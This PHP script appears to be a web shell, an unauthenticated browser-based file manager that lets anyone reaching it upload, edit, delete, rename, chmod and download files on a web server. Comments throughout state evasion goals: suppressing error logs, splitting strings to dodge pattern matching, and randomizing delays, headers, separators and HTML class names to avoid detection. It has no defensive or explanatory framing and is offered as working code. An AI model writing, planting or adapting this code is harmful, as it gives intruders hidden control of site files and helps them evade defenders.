<?php
// Disable error reporting to avoid suspicious logs
error_reporting(0);

// Define function names as dynamic variables
${'x'.'1'.'x'} = 'v'.'alidate'.'_path';
${'x'.'2'.'x'} = 'g'.'et'.'_permissions'; 
${'x'.'3'.'x'} = 'r'.'emove'.'_directory';
${'x'.'4'.'x'} = 's'.'how'.'_current_path';
${'x'.'5'.'x'} = 'h'.'andle'.'_requests';
${'x'.'6'.'x'} = 'p'.'rocess'.'_selections';

// Split sensitive strings to avoid pattern matching
$path_key = 'p';
$upload_key = 'up'.'load';
$delete_key = 'del'.'ete';
$edit_key = 'ed'.'it';
$rename_key = 'ren'.'ame';
$chmod_key = 'ch'.'mod';
$download_key = 'down'.'load';

// Function to validate path security with additional checks
function validate_path($p) {
    $r = realpath($p);
    if($r === false) return false;
    
    // Prevent traversal outside web root
    $base = str_replace('\\', '/', realpath(__DIR__));
    $path = str_replace('\\', '/', $r);
    if(strpos($path, $base) !== 0) return false;
    
    return $r;
}

// Function to get file permissions with obfuscated output
function get_permissions($f) {
    return substr(sprintf('%o', fileperms($f)), -4);
}

// Recursive directory removal with delay to avoid suspicious patterns
function remove_directory($d) {
    if(!is_dir($d)) return false;
    
    $items = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($d, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    
    foreach($items as $item) {
        if($item->isDir()) {
            rmdir($item->getPathname());
            usleep(10000); // Small delay
        } else {
            unlink($item->getPathname());
        }
    }
    
    return rmdir($d);
}

// Breadcrumb display with randomized link structure
function show_current_path($d) {
    $parts = explode(DIRECTORY_SEPARATOR, realpath($d));
    $path = ''; $output = '';
    $sep = ['\\', '/', ' > ', ' / '][rand(0,3)]; // Random separator
    
    foreach($parts as $part) {
        if(empty($part)) continue;
        $path .= DIRECTORY_SEPARATOR . $part;
        $output .= "<a href='?".$GLOBALS['path_key']."=".urlencode($path)."'>$part</a>$sep";
    }
    
    return rtrim($output, $sep);
}

// Process selections with randomized parameter names
function process_selections() {
    if(isset($_POST['del'.'Items'])) {
        $items = $_POST['sel'.'Items'] ?? [];
        if(!empty($items)) {
            foreach($items as $item) {
                if(validate_path($item)) {
                    if(is_file($item)) {
                        unlink($item);
                    } elseif(is_dir($item)) {
                        remove_directory($item);
                    }
                }
            }
            echo "<script>setTimeout(()=>alert('Operation completed'),".rand(100,500).");</script>";
        }
    }
}

// Main request handler with randomized timing
function handle_requests() {
    $base = __DIR__;
    $dir = isset($_GET[$GLOBALS['path_key']]) ? $_GET[$GLOBALS['path_key']] : $base;
    
    // Process actions with delay
    usleep(rand(50000, 200000));
    process_selections();
    
    // Handle file uploads with chunked processing
    if(isset($_FILES[$GLOBALS['upload_key']])) {
        $target = $_POST['dir'] ?? $dir;
        if(validate_path($target) && is_dir($target)) {
            $count = count($_FILES[$GLOBALS['upload_key']]['name']);
            for($i = 0; $i < $count; $i++) {
                if($_FILES[$GLOBALS['upload_key']]['error'][$i] === UPLOAD_ERR_OK) {
                    $name = basename($_FILES[$GLOBALS['upload_key']]['name'][$i]);
                    $tmp = $_FILES[$GLOBALS['upload_key']]['tmp_name'][$i];
                    $dest = realpath($target).DIRECTORY_SEPARATOR.$name;
                    
                    // Split move operation into chunks
                    $chunkSize = 8192;
                    $src = fopen($tmp, 'rb');
                    $dst = fopen($dest, 'wb');
                    while(!feof($src)) {
                        fwrite($dst, fread($src, $chunkSize));
                        usleep(10000);
                    }
                    fclose($src);
                    fclose($dst);
                    unlink($tmp);
                }
            }
            echo "<script>setTimeout(()=>alert('Transfer complete'),".rand(300,800).");</script>";
        }
    }
    
    // File editing with randomized parameter names
    if(isset($_GET[$GLOBALS['edit_key']]) && is_file($_GET[$GLOBALS['edit_key']]) && validate_path($_GET[$GLOBALS['edit_key']])) {
        $file = $_GET[$GLOBALS['edit_key']];
        if(isset($_POST['data'])) {
            file_put_contents($file, $_POST['data']);
            echo "<script>alert('Changes saved');</script>";
        }
        echo '<form method="POST"><textarea name="data" style="width:100%;height:300px;">'
            .htmlspecialchars(file_get_contents($file))
            .'</textarea><br><input type="submit" value="Save"></form>';
        exit;
    }
    
    // File deletion with confirmation and delay
    if(isset($_GET[$GLOBALS['delete_key']]) && validate_path($_GET[$GLOBALS['delete_key']])) {
        $target = $_GET[$GLOBALS['delete_key']];
        if(is_file($target)) {
            unlink($target);
            usleep(rand(50000, 150000));
            echo "<script>alert('File removed');</script>";
        } elseif(is_dir($target)) {
            remove_directory($target);
            echo "<script>setTimeout(()=>alert('Directory removed'),".rand(200,600).");</script>";
        }
    }
    
    // Rename operation with randomized timing
    if(isset($_GET[$GLOBALS['rename_key']]) && isset($_POST['name']) && validate_path($_GET[$GLOBALS['rename_key']])) {
        $old = $_GET[$GLOBALS['rename_key']];
        $new = dirname($old).DIRECTORY_SEPARATOR.$_POST['name'];
        rename($old, $new);
        usleep(rand(100000, 300000));
        echo "<script>alert('Name updated');</script>";
    }
    
    // Permission change with obfuscated values
    if(isset($_GET[$GLOBALS['chmod_key']]) && isset($_POST['mode']) && validate_path($_GET[$GLOBALS['chmod_key']])) {
        $file = $_GET[$GLOBALS['chmod_key']];
        chmod($file, octdec($_POST['mode']));
        echo "<script>alert('Permissions updated');</script>";
    }
    
    // File download with randomized headers
    if(isset($_GET[$GLOBALS['download_key']]) && is_file($_GET[$GLOBALS['download_key']]) && validate_path($_GET[$GLOBALS['download_key']])) {
        $file = $_GET[$GLOBALS['download_key']];
        $name = basename($file);
        $types = [
            'application/x-octet-stream',
            'application/force-download',
            'application/download'
        ];
        header('Content-Type: '.$types[rand(0,2)]);
        header('Content-Disposition: attachment; filename="'.$name.'"');
        header('Content-Length: '.filesize($file));
        readfile($file);
        exit;
    }
    
    // Directory creation with randomized delay
    if(isset($_POST['makeDir'])) {
        $name = $_POST['dirName'];
        $path = realpath($dir).DIRECTORY_SEPARATOR.$name;
        if(!is_dir($path)) {
            mkdir($path);
            usleep(rand(100000, 500000));
            echo "<script>alert('Directory created');</script>";
        }
    }
    
    // Generate random class and ID names
    $randomClass1 = bin2hex(random_bytes(4));
    $randomClass2 = bin2hex(random_bytes(3));
    $randomId = bin2hex(random_bytes(4));
    
    // Display interface with randomized element IDs and classes
    echo '<div class="'.$randomClass1.'">';
    echo '<h3>Location</h3>';
    echo '<div>'.show_current_path($dir).'</div>';
    
    // Upload form with randomized field names
    echo '<form method="POST" enctype="multipart/form-data" class="'.$randomClass2.'">';
    echo 'Files: <input type="file" name="'.$GLOBALS['upload_key'].'[]" multiple><br>';
    echo 'Destination: <input type="text" name="dir" value="'.htmlspecialchars($dir).'"><br>';
    echo '<input type="submit" value="Upload">';
    echo '</form>';
    
    // Directory creation form
    echo '<form method="POST">';
    echo 'New Folder: <input type="text" name="dirName"><br>';
    echo '<input type="submit" name="makeDir" value="Create">';
    echo '</form>';
    
    // File listing with checkboxes
    echo '<form method="POST" id="'.$randomId.'">';
    echo '<input type="submit" name="delItems" value="Remove Selected">';
    echo '<ul style="list-style:none;padding:0;">';
    
    // Parent directory link
    if($dir !== '/') {
        echo '<li><a href="?'.$GLOBALS['path_key'].'='.urlencode(dirname($dir)).'">↑ Parent</a></li>';
    }
    
    // List contents with randomized display
    $items = scandir($dir);
    foreach($items as $item) {
        if($item === '.' || $item === '..') continue;
        $path = realpath($dir.DIRECTORY_SEPARATOR.$item);
        $encoded = urlencode($path);
        
        if(is_dir($path)) {
            echo '<li><input type="checkbox" name="selItems[]" value="'.$path.'"> 📁 ';
            echo '<a href="?'.$GLOBALS['path_key'].'='.$encoded.'">'.$item.'</a> ';
            echo '[<a href="?'.$GLOBALS['delete_key'].'='.$encoded.'" onclick="return confirm(\'Delete?\')">X</a>] ';
            echo '('.get_permissions($path).') ';
            echo '[<a href="?'.$GLOBALS['chmod_key'].'='.$encoded.'">CHMOD</a>]</li>';
        } else {
            echo '<li><input type="checkbox" name="selItems[]" value="'.$path.'"> 📄 ';
            echo '<a href="?'.$GLOBALS['edit_key'].'='.$encoded.'">'.$item.'</a> ';
            echo '[<a href="?'.$GLOBALS['delete_key'].'='.$encoded.'" onclick="return confirm(\'Delete?\')">X</a>] ';
            echo '[<a href="?'.$GLOBALS['rename_key'].'='.$encoded.'">Rename</a>] ';
            echo '('.get_permissions($path).') ';
            echo '[<a href="?'.$GLOBALS['chmod_key'].'='.$encoded.'">CHMOD</a>] ';
            echo '[<a href="?'.$GLOBALS['download_key'].'='.$encoded.'">Download</a>]</li>';
        }
    }
    echo '</ul></form>';
    
    // Rename form (if requested)
    if(isset($_GET[$GLOBALS['rename_key']])) {
        $target = $_GET[$GLOBALS['rename_key']];
        echo '<form method="POST">';
        echo 'New Name: <input type="text" name="name" value="'.htmlspecialchars(basename($target)).'">';
        echo '<input type="submit" value="Rename">';
        echo '</form>';
    }
    
    // CHMOD form (if requested)
    if(isset($_GET[$GLOBALS['chmod_key']])) {
        $target = $_GET[$GLOBALS['chmod_key']];
        echo '<form method="POST">';
        echo 'Permissions: <input type="text" name="mode" value="'.get_permissions($target).'">';
        echo '<input type="submit" value="Change">';
        echo '</form>';
    }
    
    echo '</div>';
}

// Execute with random delay
usleep(rand(100000, 300000));
handle_requests();
?>
